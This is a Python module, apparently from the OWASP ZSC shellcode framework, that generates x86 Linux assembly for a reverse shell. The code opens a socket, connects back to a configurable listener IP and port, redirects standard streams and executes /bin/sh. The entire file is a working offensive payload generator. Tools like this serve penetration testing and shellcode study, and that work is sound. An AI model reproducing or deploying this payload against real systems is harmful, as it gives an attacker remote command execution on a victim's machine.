# https://systemoverlord.com/2018/10/30/understanding-shellcode-the-reverse-shell.html
from owasp_zsc.new_cores import base_module, stack, alert


class Module(base_module.BasePayload):
    lhost = base_module.OptIP("", "Listen IP address")
    lport = base_module.OptPort("", "Listen port")
    shell = base_module.OptString("/bin/sh", "Shell to execute")

    def generate(self):
        payload = "mov $1, %bl\n"
        payload += "push $0\n"
        payload += "push $1\n"
        payload += "push $2\n"
        payload += "mov %esp, %ecx\n"
        payload += "mov $0x66, %al\n"
        payload += "int $0x80\n"
        payload += f"push ${stack.ipv4_to_hex(self.lhost)}\n"  # PUSH IP
        if self.lport < 256:
            payload += f"mov ${hex(self.lport)}, %bl\n"  # MOV PORT
        else:
            payload += f"mov ${hex(self.lport)}, %bx\n"  # MOV PORT
        payload += "push %bx\n"
        payload += "mov $0x2, %bl\n"
        payload += "push %bx\n"
        payload += "mov %esp, %ebx\n"
        payload += "push $0x10\n"
        payload += "push %ebx\n"
        payload += "push %eax\n"
        payload += "mov %esp, %ecx\n"
        payload += "mov $0x3, %bl\n"
        payload += "push %eax\n"
        payload += "mov $0x66, %al\n"
        payload += "int $0x80\n"
        payload += "pop %ebx\n"
        payload += "mov $0x2, %cl\n"
        payload += "mov $0x3f, %al\n"
        payload += "int $0x80\n"
        payload += "dec %ecx\n"
        payload += "mov $0x3f, %al\n"
        payload += "int $0x80\n"
        payload += stack.generate(self.shell, '%ebx', 'string')
        payload += "mov %esp, %ebx\n"
        payload += "xor %eax, %eax\n"
        payload += "push %eax\n"
        payload += "push %ebx\n"
        payload += "mov %esp, %ecx\n"
        payload += "xor %edx, %edx\n"
        payload += "mov $0xb, %al\n"
        payload += "int $0x80\n"

        return payload

    def run(self):
        if not self.lhost:
            alert.error("Listen address")
            return
        if not self.lport:
            alert.error("Listen port")
            return
        self.handle_generate(__name__)
